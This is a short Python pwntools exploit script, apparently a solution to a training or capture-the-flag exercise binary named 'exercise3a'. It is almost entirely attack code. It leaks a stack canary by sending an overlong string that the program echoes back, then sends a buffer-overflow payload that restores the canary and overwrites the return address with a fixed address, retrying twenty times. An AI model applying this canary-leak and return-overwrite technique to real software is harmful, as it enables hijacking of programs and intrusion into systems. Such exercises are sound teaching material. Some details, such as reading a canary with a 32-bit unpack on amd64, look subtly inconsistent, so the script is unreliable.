#!/usr/bin/env python
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template
from pwn import *

# Set up pwntools for the correct architecture
context.update(arch='amd64')
exe = './exercise3a'

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR


def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
c
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

def exploit():
    r = start()
    print(cyclic_find(0x000000006261616F)) # 156
    print(cyclic_find(0x0000000061616167)) # 24
    r.sendline(cyclic(155))
    r.recvuntil(b"Well of course ")
    contains_canary = r.recvuntil(b" is not the password")
    canary = u32(contains_canary[:-len(" is not the password")][156:])
    print(f"Canary: {hex(canary)}")
    r.sendline(b"A"*156+p32(canary)+b"B"*24+p64(0x0401256))
    r.recvuntil("is not the password\n")
    print(r.recvall(timeout=1).decode())

for i in range(20):
    try:
        exploit()
    except:
        pass